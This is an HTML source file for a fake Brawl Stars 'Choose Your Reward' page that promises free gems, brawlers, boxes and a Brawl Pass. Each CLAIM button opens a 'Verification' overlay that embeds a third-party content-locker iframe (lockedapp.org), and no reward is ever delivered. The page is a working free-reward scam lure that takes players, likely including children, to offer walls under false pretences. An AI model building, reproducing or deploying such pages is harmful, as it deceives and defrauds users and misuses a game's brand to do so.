<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Brawl Style Reward Page</title>

  <script src="https://cdn.tailwindcss.com"></script>

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Lilita+One&family=Luckiest+Guy&family=Nunito:wght@700;800;900&display=swap" rel="stylesheet">

  <style>
    body {
      font-family: "Nunito", sans-serif;
      background:
        radial-gradient(circle at 20% 20%, rgba(255, 255, 255, 0.05) 0 2px, transparent 2px 100%),
        radial-gradient(circle at 80% 40%, rgba(255, 255, 255, 0.04) 0 2px, transparent 2px 100%),
        linear-gradient(180deg, #123d97 0%, #1550b7 45%, #2468e8 100%);
    }

    .font-lilita {
      font-family: "Lilita One", sans-serif;
    }

    .font-luckiest {
      font-family: "Luckiest Guy", cursive;
    }

    .pattern-bg {
      background-image:
        radial-gradient(circle at center, rgba(0, 0, 0, .45) 0 8px, transparent 9px),
        linear-gradient(45deg, transparent 40%, rgba(0, 0, 0, .18) 40% 60%, transparent 60%);
      background-size: 110px 110px, 140px 140px;
      background-position: 0 0, 30px 20px;
    }

    .panel-bg {
      background: linear-gradient(180deg, #5a7fe6 0%, #436cd4 100%);
    }

    .reward-card-bg {
      background:
        linear-gradient(135deg, rgba(255, 255, 255, .12) 0 22%, transparent 22% 100%),
        radial-gradient(circle at center, rgba(255, 255, 255, .18) 0%, rgba(255, 255, 255, .06) 22%, transparent 58%),
        repeating-conic-gradient(
          from 0deg,
          rgba(255, 255, 255, .08) 0deg 18deg,
          transparent 18deg 36deg
        ),
        linear-gradient(180deg, #b43cff, #8427ff 56%, #6d1ce5);
    }

    .claim-btn-bg {
      background: linear-gradient(180deg, #49a3ff, #2c79ff);
    }

    .selected-card-bg {
      background:
        linear-gradient(135deg, rgba(255,255,255,.18) 0 22%, transparent 22% 100%),
        radial-gradient(circle at center, rgba(255, 255, 255, .22) 0%, rgba(255, 255, 255, .08) 22%, transparent 58%),
        repeating-conic-gradient(
          from 0deg,
          rgba(255,255,255,.12) 0deg 18deg,
          transparent 18deg 36deg
        ),
        linear-gradient(180deg, #ffca3a, #ff9f1c 56%, #ff7b00);
      border-color: rgba(111, 55, 0, 0.75) !important;
      box-shadow:
        0 7px 0 #c35d00,
        inset 0 2px 0 rgba(255,255,255,.2),
        0 0 0 3px rgba(255, 226, 120, 0.22);
      transform: translateY(-3px) scale(1.02);
    }

    .panel-title-shadow {
      text-shadow:
        0 4px 0 #18264c,
        2px 0 0 #18264c,
        -2px 0 0 #18264c,
        0 -2px 0 #18264c,
        2px 2px 0 #18264c,
        -2px 2px 0 #18264c;
    }

    .sub-shadow {
      text-shadow:
        0 1px 0 rgba(0, 0, 0, .65),
        1px 0 0 rgba(0, 0, 0, .65),
        -1px 0 0 rgba(0, 0, 0, .65);
    }

    .claim-shadow {
      text-shadow:
        0 2px 0 rgba(0, 0, 0, .45),
        1px 0 0 rgba(0, 0, 0, .45),
        -1px 0 0 rgba(0, 0, 0, .45);
    }

    .reward-img {
      filter: drop-shadow(0 3px 0 rgba(0, 0, 0, .25));
      image-rendering: -webkit-optimize-contrast;
    }

    @keyframes logoFloat {
      0%, 100% {
        transform: translateY(0) scale(1);
        filter: drop-shadow(0 6px 0 black);
      }
      50% {
        transform: translateY(-8px) scale(1.03);
        filter: drop-shadow(0 10px 0 black);
      }
    }

    @keyframes rewardFloat {
      0%, 100% {
        transform: translateY(0) scale(1);
      }
      50% {
        transform: translateY(-6px) scale(1.04);
      }
    }

    @keyframes pulseGlow {
      0%, 100% {
        transform: scale(1);
        box-shadow:
          0 6px 0 #1450c8,
          inset 0 2px 0 rgba(255,255,255,.16),
          0 0 0 0 rgba(73,163,255,.35);
      }
      50% {
        transform: scale(1.03);
        box-shadow:
          0 6px 0 #1450c8,
          inset 0 2px 0 rgba(255,255,255,.16),
          0 0 0 10px rgba(73,163,255,0);
      }
    }

    @keyframes shineSweep {
      0% { transform: translateX(-130%) skewX(-20deg); }
      100% { transform: translateX(220%) skewX(-20deg); }
    }

    .logo-animate {
      animation: logoFloat 2.8s ease-in-out infinite;
      transform-origin: center;
      will-change: transform, filter;
    }

    .reward-animate {
      animation: rewardFloat 2.2s ease-in-out infinite;
      transform-origin: center;
      will-change: transform;
    }

    .cta-pulse {
      animation: pulseGlow 1.9s ease-in-out infinite;
    }

    .shine-wrap {
      position: relative;
      overflow: hidden;
    }

    .shine-wrap::after {
      content: "";
      position: absolute;
      top: -20%;
      left: -40%;
      width: 38%;
      height: 140%;
      background: linear-gradient(
        90deg,
        transparent,
        rgba(255,255,255,.28),
        transparent
      );
      animation: shineSweep 2.6s linear infinite;
      pointer-events: none;
    }

    .hide {
      display: none !important;
    }
    @keyframes lockerScaleIn {
  0% {
    opacity: 0;
    transform: scale(0.82);
  }
  60% {
    opacity: 1;
    transform: scale(1.04);
  }
  100% {
    opacity: 1;
    transform: scale(1);
  }
}

.locker-scale-in {
  animation: lockerScaleIn 0.35s cubic-bezier(0.2, 0.8, 0.2, 1) forwards;
  transform-origin: center;
}
  </style>
</head>

<body class="text-white overflow-x-hidden relative min-h-screen w-full">
  <div class="pattern-bg fixed inset-0 opacity-[0.08] pointer-events-none"></div>

  <main class="relative z-[1] w-full max-w-[390px] max-[480px]:max-w-[370px] max-[360px]:max-w-[340px] mx-auto p-0">
    <section class="panel-bg min-h-screen px-[10px] pt-[10px] pb-[110px] max-[480px]:pt-[8px] max-[480px]:px-[10px] max-[480px]:pb-[120px] rounded-b-[26px] max-[480px]:rounded-b-none border-l-[3px] border-r-[3px] border-b-[3px] border-l-[rgba(21,41,92,0.75)] border-r-[rgba(21,41,92,0.75)] border-b-[rgba(21,41,92,0.75)] shadow-[inset_0_2px_0_rgba(255,255,255,.16)]">

      <div class="flex justify-center pt-3 mb-2">
        <img
          src="/assets/brawlstars.png"
          alt="Brawl Stars"
          class="logo-animate w-[120px] max-w-full"
        >
      </div>

      <h2 class="font-luckiest text-center uppercase text-white leading-none tracking-[0.5px] text-[24px] max-[480px]:text-[22px] max-[360px]:text-[20px] mb-[10px] panel-title-shadow">
        CHOOSE YOUR REWARD
      </h2>

      <p class="text-center text-[12px] font-extrabold mb-3 text-white/95 [text-shadow:0_1px_0_rgba(0,0,0,.45)]">
        Pick one reward below, then continue to unlock it.
      </p>

      <div id="selectedRewardBox" class="hide mb-3 rounded-[16px] border-[2px] border-[rgba(28,61,20,0.7)] bg-[linear-gradient(180deg,#7df57a,#3ecf5f)] px-3 py-3 text-center shadow-[0_5px_0_#1c9f3d,inset_0_2px_0_rgba(255,255,255,.18)]">
        <div class="text-[11px] font-black uppercase tracking-[0.4px] mb-1 [text-shadow:0_1px_0_rgba(0,0,0,.35)]">
          Selected Reward
        </div>
        <div id="selectedRewardName" class="font-lilita text-[20px] uppercase leading-none [text-shadow:2px_2px_0_black,-2px_2px_0_black,2px_-2px_0_black,-2px_-2px_0_black]">
          Reward
        </div>
      </div>

      <div id="cardsContainer" class="grid grid-cols-2 gap-x-[12px] gap-y-[12px] max-[480px]:gap-x-[12px] max-[480px]:gap-y-[14px] max-[360px]:gap-x-[10px] max-[360px]:gap-y-[12px]"></div>
    </section>
  </main>



<script>
   function openLocker() {
      document.getElementById("lockerOverlay").classList.remove("hidden");
    }
    function closeLocker() {
      document.getElementById("lockerOverlay").classList.add("hidden");
    }
  const rewards = [
    {
      name: "ULTRA CHAOS<br>DROPS",
      plainName: "ULTRA CHAOS DROPS",
      sub: "",
      image: "https://i.postimg.cc/T322TFXc/Rare-Chaos-Drop.webp",
      alt: "Ultra Chaos Drops",
      url: "#"
    },
    {
      name: "2000 GEMS",
      plainName: "2000 GEMS",
      sub: "",
      image: "https://i.postimg.cc/8PhpH5D8/Item-7-1.png",
      alt: "2000 Gems",
      url: "#"
    },
    {
      name: "SIRIUS BOX",
      plainName: "SIRIUS BOX",
      sub: "",
      image: "https://i.postimg.cc/WbjGSdrZ/Item-16.png",
      alt: "Sirius Box",
      url: "#"
    },
    {
      name: "KAZE",
      plainName: "KAZE",
      sub: "ULTRA LEGENDARY BRAWLERS",
      image: "https://i.postimg.cc/gkvzDJd0/Item-10-1.png",
      alt: "Kaze",
      url: "#"
    },
    {
      name: "BRAWL PASS<br>PLUS",
      plainName: "BRAWL PASS PLUS",
      sub: "",
      image: "https://i.postimg.cc/HkwgQPwr/Item-3-webp.webp",
      alt: "Brawl Pass Plus",
      url: "#"
    },
    {
      name: "SIRIUS<br>BRAWLER",
      plainName: "SIRIUS BRAWLER",
      sub: "",
      image: "https://i.postimg.cc/Kv8LH9sQ/Sirius-Skin-Default.webp",
      alt: "Sirius Brawler",
      url: "#"
    },
    {
      name: "ULTRA BOX",
      plainName: "ULTRA BOX",
      sub: "",
      image: "https://i.postimg.cc/jdzxX5KS/Item-11.png",
      alt: "Ultra Box",
      url: "#"
    },
    {
      name: "BUFFIES",
      plainName: "BUFFIES",
      sub: "",
      image: "https://i.postimg.cc/YC6H1y64/Item-2-webp.webp",
      alt: "Buffies",
      url: "#"
    },
    {
      name: "VALENTINE'S BOX",
      plainName: "VALENTINE'S BOX",
      sub: "",
      image: "https://i.postimg.cc/MKy6DTxT/Item-15.png",
      alt: "Valentine Box",
      url: "#"
    }
  ];

  const cardsContainer = document.getElementById("cardsContainer");

  function renderRewards() {
    cardsContainer.innerHTML = rewards.map((reward, index) => `
      <div
        class="reward-card reward-card-bg min-h-[214px] max-[480px]:min-h-[212px] max-[360px]:min-h-[198px] rounded-[20px] max-[480px]:rounded-[18px] px-[10px] py-[12px] max-[360px]:px-[8px] max-[360px]:py-[10px] relative overflow-hidden border-[2px] border-[rgba(84,0,155,0.72)] shadow-[0_6px_0_#6016be,inset_0_2px_0_rgba(255,255,255,.14)] flex flex-col items-center justify-between transition-all duration-200"
      >
        <div class="font-lilita text-center uppercase text-white font-black leading-[1.05] tracking-[0.4px] text-[20px] [text-shadow:2px_2px_0_black,-2px_2px_0_black,2px_-2px_0_black,-2px_-2px_0_black]">
          ${reward.name}
        </div>

        <div class="flex-1 w-full flex items-center justify-center pt-[6px] pb-[8px]">
          <img
            src="${reward.image}"
            alt="${reward.alt}"
            style="animation-delay: ${index * 0.18}s"
            class="reward-img reward-animate block w-auto h-auto object-contain max-w-[78px] max-h-[78px] max-[480px]:max-w-[82px] max-[480px]:max-h-[82px] max-[360px]:max-w-[72px] max-[360px]:max-h-[72px]"
          >
        </div>

        <button
          onclick="openLocker()"
          class="claim-now-btn claim-btn-bg tracking-widest w-full border-0 cursor-pointer rounded-[10px] py-[11px] font-black text-[11px] max-[480px]:text-[14px] text-white uppercase font-lilita tracking-[0.4px] shadow-[0_5px_0_#1450c8,inset_0_2px_0_rgba(255,255,255,.16)] active:translate-y-[2px] active:shadow-[0_3px_0_#1450c8,inset_0_2px_0_rgba(255,255,255,.16)] claim-shadow">
          CLAIM
        </button>
      </div>
    `).join("");

   
  }

  renderRewards();
</script>
<div
    id="lockerOverlay"
    class="fixed inset-0 hidden z-50 bg-black/40 flex items-center justify-center px-3"
    onclick="closeLocker()"
  >
    <div
      class="locker-scale-in w-[92%] md:w-[60%] lg:w-[40%] h-[80vh] bg-white rounded-xl overflow-hidden shadow-2xl border border-gray-300"
      onclick="event.stopPropagation()"
    >
      <div class="flex items-center justify-between px-3 py-2 bg-gray-50 border-b">
        <p class="font-game text-sm text-gray-700">Verification</p>
      </div>

      <iframe
        src="https://lockedapp.org/cl/i/veevp9"
        class="w-full h-full border-0"
        scrolling="yes"
        title="locker"
      ></iframe>
    </div>
  </div>
</body>
</html>
